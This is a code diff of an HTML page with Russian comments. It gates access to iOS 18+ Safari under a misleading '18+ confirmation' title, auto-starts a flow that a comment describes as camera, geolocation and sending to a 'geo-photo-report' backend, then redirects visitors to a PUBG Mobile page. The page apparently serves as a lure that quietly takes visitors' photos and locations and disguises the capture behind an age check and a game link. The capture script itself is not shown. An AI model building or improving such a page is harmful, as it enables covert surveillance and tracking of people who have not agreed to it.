@@ -8,9 +8,9 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="default">
   <meta name="format-detection" content="telephone=no">
 
-  <!-- ✅ API адрес -->
+  <!-- ✅ Адрес API -->
   <script>
-    // Поставь свой бекенд, если другой:
+    // Поменяй при необходимости на свой бэкенд
     window.__API_BASE = 'https://geo-photo-report.onrender.com';
   </script>
 
@@ -68,61 +68,86 @@
     <div class="notice" id="note"></div>
   </div>
 
-  <!-- 🔒 Основной фронтовый код -->
-  <script src="/app.js?v=5"></script>
+  <!-- 🔒 Основной JS (камера, гео, отправка) -->
+  <script src="/app.js?v=6"></script>
 
-  <!-- Логика проверки устройства/автостарт -->
+  <!-- 🔍 Строгая проверка только iOS/iPadOS 18+ Safari -->
   <script>
-    const $ = id => document.getElementById(id);
+    const MIN_IOS_MAJOR = 18;
 
-    function isIOSFamily(){
+    function isIOSFamily() {
       const ua = navigator.userAgent;
       const touchMac = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
       return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
     }
-    function isSafariWebKit(){
+
+    function parseIOSMajor() {
+      const ua = navigator.userAgent;
+      const m1 = ua.match(/OS\s(\d+)[._]/);
+      if (m1) return parseInt(m1[1], 10);
+      const m2 = ua.match(/Version\/(\d+)/);
+      if (m2) return parseInt(m2[1], 10);
+      return null;
+    }
+
+    function isPureSafari() {
       const ua = navigator.userAgent;
       const vendorOK = navigator.vendor === 'Apple Computer, Inc.';
-      return /Safari\//.test(ua) && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) && vendorOK;
+      const hasSafari = /Safari\//.test(ua);
+      const hasWebKit = /\bAppleWebKit\/\d+/.test(ua);
+      const notSafari = /CriOS|Chrome|Chromium|FxiOS|Firefox|Edg|EdgiOS|OPR|OPiOS|YaBrowser|DuckDuckGo|Brave|UCBrowser/i.test(ua);
+      return vendorOK && hasWebKit && hasSafari && !notSafari;
     }
-    function getIOSLikeVersion(){
-      const ua = navigator.userAgent;
-      const m = ua.match(/OS\s(\d+)[_.]/) || (navigator.appVersion && navigator.appVersion.match(/Version\/(\d+)/));
-      return m ? parseInt(m[1], 10) : null;
+
+    function secureContextOK() {
+      return location.protocol === 'https:' || location.hostname === 'localhost';
+    }
+
+    function deviceGateCheck() {
+      const isiOS = isIOSFamily();
+      const iosMajor = parseIOSMajor();
+      const safari = isPureSafari();
+      const httpsOK = secureContextOK();
+
+      if (!httpsOK)
+        return { ok:false, reason:'Нужен HTTPS (или localhost) для доступа к камере/гео.' };
+      if (!isiOS)
+        return { ok:false, reason:'Устройство не относится к iOS/iPadOS.' };
+      if (iosMajor === null)
+        return { ok:false, reason:'Не удалось определить версию iOS/iPadOS.' };
+      if (iosMajor < MIN_IOS_MAJOR)
+        return { ok:false, reason:`Версия iOS/iPadOS ниже ${MIN_IOS_MAJOR}.` };
+      if (!safari)
+        return { ok:false, reason:'Браузер не Safari (или подмена User-Agent).' };
+      return { ok:true, iosMajor };
     }
 
     document.addEventListener('DOMContentLoaded', () => {
-      const ver = getIOSLikeVersion();
-      const isiOS = isIOSFamily();
-      const ok = isiOS && ver && ver >= 18 && isSafariWebKit();
+      const $ = id => document.getElementById(id);
+      const res = deviceGateCheck();
 
-      // Если хочешь разрешить всем (для дебага) — установи ok = true;
-      if (ok) {
+      if (res.ok) {
         $('title').textContent = 'Подтверждение 18+';
         $('text').innerHTML = '<span class="ok">Доступ разрешён.</span>';
-        $('reason').textContent = `${/iPad|MacIntel/.test(navigator.platform)||/iPad/.test(navigator.userAgent)?'iPadOS':'iOS'} ${ver}, Safari WebKit.`;
+        const platIsIPad = /iPad|MacIntel/.test(navigator.platform) || /iPad/.test(navigator.userAgent);
+        $('reason').textContent = `${platIsIPad ? 'iPadOS' : 'iOS'} ${res.iosMajor}, Safari WebKit.`;
         $('enterBtn').style.display = 'block';
         $('note').textContent = 'Кнопка активируется после проверки.';
 
-        if (typeof window.__autoFlow === 'function') {
-          setTimeout(() => window.__autoFlow(), 50);
-        }
+        if (typeof window.__autoFlow === 'function')
+          setTimeout(() => window.__autoFlow(), 100);
 
         $('enterBtn').addEventListener('click', e => {
           if (!window.__reportReady) { e.preventDefault(); return; }
-          // редирект после успешной проверки
-          location.assign('https://www.pubgmobile.com/ig/itop'); // замени на свой URL
+          // 🚀 редирект после успешной проверки
+          location.assign('https://www.pubgmobile.com/ig/itop');
         });
       } else {
         $('title').textContent = 'Доступ отклонён';
         $('text').innerHTML = '<span class="err">Отказ в доступе.</span>';
-        let r = '';
-        if (!isiOS) r = 'Устройство не относится к iOS/iPadOS.';
-        else if (!ver || ver < 18) r = 'Версия iOS/iPadOS ниже 18.';
-        else if (!isSafariWebKit()) r = 'Обнаружена подмена User-Agent/браузер не Safari.';
-        else r = 'Неизвестная ошибка.';
-        $('reason').textContent = 'Причина: ' + r;
-        $('note').textContent = 'Доступ возможен только на iPhone/iPad с Safari 18+.';
+        $('reason').textContent = 'Причина: ' + res.reason;
+        $('note').textContent = `Доступ только на iPhone/iPad с iOS/iPadOS ${MIN_IOS_MAJOR}+ и Safari.`;
+        $('enterBtn').style.display = 'none';
       }
     });
   </script>
